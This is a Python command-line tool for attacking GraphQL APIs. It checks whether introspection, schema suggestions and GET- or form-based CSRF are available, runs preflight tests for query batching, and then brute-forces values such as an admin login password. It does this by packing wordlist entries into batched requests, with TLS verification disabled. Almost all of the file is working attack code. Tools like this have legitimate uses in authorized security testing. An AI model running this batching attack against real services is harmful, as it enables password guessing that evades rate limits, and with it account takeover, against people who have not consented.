import json
import requests
import argparse
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("-e", "--endpoint", help="GraphQL Endpoint (i.e. https://example.com/graphql).")
parser.add_argument("-v", "--variable", help="Variable input to GraphQL (i.e. '{\"loginInput\":{\"email\":\"admin@example.com\",\"password\":\"#VARIABLE#\",\"rememberMe\":false}}').")
parser.add_argument("-P", "--preflight", help="Only run preflight request to see if batching is possible (requires introspection enabled).")
parser.add_argument("-q", "--query", help="File containing the full GraphQL query to perform batching attack on. Add #VARIABLE# where you would like replacement.")
parser.add_argument("-w", "--wordlist", help="Wordlist to be attempted via batching (will replace each batch respectively with the values from the wordlist.")
parser.add_argument('-H', "--header", action='append', nargs='+')
parser.add_argument("-p", "--proxy", help="Proxy to use during request (localhost:8080).")
parser.add_argument("-s", "--size", help="The total batch size, how many times the query will repeat.")
parser.add_argument("-o", "--output", help="Output GraphQL responses to file.", default="output.txt")
args = parser.parse_args()

if args.endpoint is None:
  print("Most provide endpoint.")
  sys.exit()

# parse headers
header_dict = {}
if args.header:
  for header in args.header:
    point_index = header.find(":")
    header_dict[header[:point_index].strip()] = header[point_index+1:].strip()

# initialise proxy dict
proxies = {'http':args.proxy, 'https': args.proxy}

# check for introspection being enabled
introspection_query = """
query IntrospectionQuery {
    __schema {
      queryType { name }
      mutationType { name }
      types {
        ...FullType
      }
      directives {
        name
        description
        locations
        args {
          ...InputValue
        }
      }
    }
  }
  fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
      name
      description
      args {
        ...InputValue
      }
      type {
        ...TypeRef
      }
      isDeprecated
      deprecationReason
    }
    inputFields {
      ...InputValue
    }
    interfaces {
      ...TypeRef
    }
    enumValues(includeDeprecated: true) {
      name
      description
      isDeprecated
      deprecationReason
    }
    possibleTypes {
      ...TypeRef
    }
  }
  fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
  }
  fragment TypeRef on __Type {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
      }
    }
  }"""

introspection_query_success = False
try:
  r = requests.post(args.endpoint, headers=header_dict, json=dict(query=introspection_query), proxies=proxies, verify=False)
  if r.json().get("data"):
    print("Introspection request was successful. Load up this endpoint in Altair GraphQL Client: https://chrome.google.com/webstore/detail/altair-graphql-client/flnheeellpciglgpaodhkhmapeljopja?hl=en")
    introspection_query_success = True
except Exception as e:
  print("Failed introspection query request. Exception: {}".format(e))

# check if graphql api is providing suggestions, only if introspection is not working
if introspection_query_success == False:
  suggestions_success = False
  suggestions_partial_success = False
  with open("1k-english.txt", "r") as english_words:
    english_word_str = " ".join([word.strip() for word in english_words.readlines()])
    suggestion_query = "query {{ {0} }}".format(english_word_str)
    try:
      r = requests.post(args.endpoint, headers=header_dict, json=dict(query=suggestion_query), proxies=proxies, verify=False)
      if r.json().get("errors"):
        for error in r.json()["errors"]:
          if "Did you mean" in error["message"]:
            suggestions_success = True
          elif "Cannot query field" in error["message"]:
            suggestions_partial_success = True
      if suggestions_success:
        print("Schema suggestions enabled. Use Clairvoyance to recover schema: https://github.com/nikitastupin/clairvoyance")
      if suggestions_success == False and suggestions_partial_success == True:
        print("Schema suggestions MAY be possible. Use Clairvoyance to recover schema: https://github.com/nikitastupin/clairvoyance")
      if suggestions_success == False and suggestions_partial_success == False:
        print("Schema suggestions don't seem to be enabled for this GraphQL API.")
    except Exception as e:
      print("Failed to confirm if schema suggestions are enabled. Exception: {}".format(e))

# check if graphql API supports form encoded or GET based queries for CSRF detection
csrf_get_based_success = False
csrf_post_based_success = False
try:
  query_body = {"query": "query { a }"}
  r = requests.get(args.endpoint, params=query_body, headers=header_dict, proxies=proxies, verify=False)
  if r.json().get("errors"):
    for error in r.json()["errors"]:
      if "Cannot query field" in error["message"]:
        csrf_get_based_success = True
  r = requests.post(args.endpoint, data=query_body, headers=header_dict, proxies=proxies, verify=False)
  if r.json().get("errors"):
    for error in r.json()["errors"]:
      if "Cannot query field" in error["message"]:
        csrf_post_based_success = True
  if csrf_get_based_success == True:
    print("CSRF GET based successful. Please confirm that this is a valid issue.")
  if csrf_post_based_success == True:
    print("CSRF POST based successful. Please confirm that this is a valid issue.")
except Exception as e:
  print("Failed to perform CSRF checks. Exception: {}".format(e))

# perform preflight requests to check for batching

# preflight #1 query name based batching
double_query = "query { assetnote: Query { hacktheplanet } assetnote1: Query { hacktheplanet } }"
double_query_success = False
try:
  r = requests.post(args.endpoint, headers=header_dict, json=dict(query=double_query), proxies=proxies, verify=False)
  if r.json().get("errors"):
    error_count = len(r.json()["errors"])
    if error_count > 1:
      print("Query name based batching: GraphQL batching is possible... preflight request was successful.")
      double_query_success = True
except Exception as e:
  print("Failed preflight request (query name based batching). Exception: {}".format(e))

# preflight #2 query JSON list based batching
repeated_query_list = "query { assetnote: Query { hacktheplanet } }"
repeated_query_dict = [{"query": repeated_query_list}, {"query": repeated_query_list}]
repeated_query_success = False
try:
  r = requests.post(args.endpoint, headers=header_dict, json=repeated_query_dict, proxies=proxies, verify=False)
  error_count = len(r.json())
  if error_count > 1:
    print("Query JSON list based batching: GraphQL batching is possible... preflight request was successful.")
    repeated_query_success = True
except Exception as e:
  print("Failed preflight request (query JSON list based batching). Exception: {}".format(e))

# this tool doesnt currently support query name based batching
# exit early and provide advice for hackers to exploit it using separate python script
if double_query_success == True and repeated_query_success == False:
  print("Your target is vulnerable to batching, however this tool does not support query name based batching. Please see: https://gist.github.com/infosec-au/505b6a19e57d5e1082450d96d03c6433")
  sys.exit()

# exit early if only performing preflight, as it's now complete
if args.preflight:
  sys.exit()

if args.query is None or args.wordlist is None or args.size is None:
  print("Most provide query, wordlist, and size to perform batching attack.")
  sys.exit()

# generate queries based off wordlist
with open(args.query, "r") as gql_query:
  gql_str = gql_query.read()

with open(args.wordlist, "r") as wordlist:
  wordlist_list = wordlist.readlines()
  for i in range(0, len(wordlist_list), int(args.size)):
    gql_list_dict = []
    for word in wordlist_list[i:i+int(args.size)]:
      if not args.variable:
        generated_query = gql_str.replace("#VARIABLE#", word.strip())
        gql_list_dict.append({"query":generated_query})
      else:
        generated_variables = args.variable.replace("#VARIABLE#", word.strip())
        gql_list_dict.append({"query": gql_str, "variables": json.loads(generated_variables)})
    attempt_str = "GraphQL Batch Attempt: {}".format(",".join([word.strip() for word in wordlist_list[i:i+int(args.size)]]))
    print(attempt_str)
    r = requests.post(args.endpoint, headers=header_dict, json=gql_list_dict, proxies=proxies, verify=False)
    if args.output:
      with open(args.output, "a") as output_file:
        output_file.write("{}: {}\n".format(attempt_str, r.json()))